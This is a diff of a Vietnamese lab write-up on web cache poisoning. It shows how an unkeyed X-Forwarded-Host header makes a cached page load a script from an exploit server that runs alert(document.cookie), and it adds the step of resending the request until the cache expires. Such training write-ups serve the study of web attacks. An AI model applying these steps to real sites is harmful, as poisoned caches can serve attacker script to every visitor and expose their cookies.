@@ -10,7 +10,7 @@ Thử thêm header `X-Forwarded-Host: abc.com` thì thấy đoạn script trở 
 ```
 Và server sẽ lưu cache trong thời gian 30s. Như vậy, để thực thi đoạn script `alert(document.cookie)`, ta vào exploit server và cấu hình đoạn body `alert(document.cookie)`, với header `Content-Type: application/javascript`, sau đó để path là `/resources/js/tracking.js`.
 
-Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net`. Kết quả thành công.
+Submit request với header `X-Forwarded-Host: https://exploit-0aa1003b03e760a1c112deb4012a0067.exploit-server.net` cho đến khi kết quả được reflected trong response (khi cache hết hạn). Kết quả thành công.
 
 # 2. Web cache poisoning with an unkeyed cookie
 
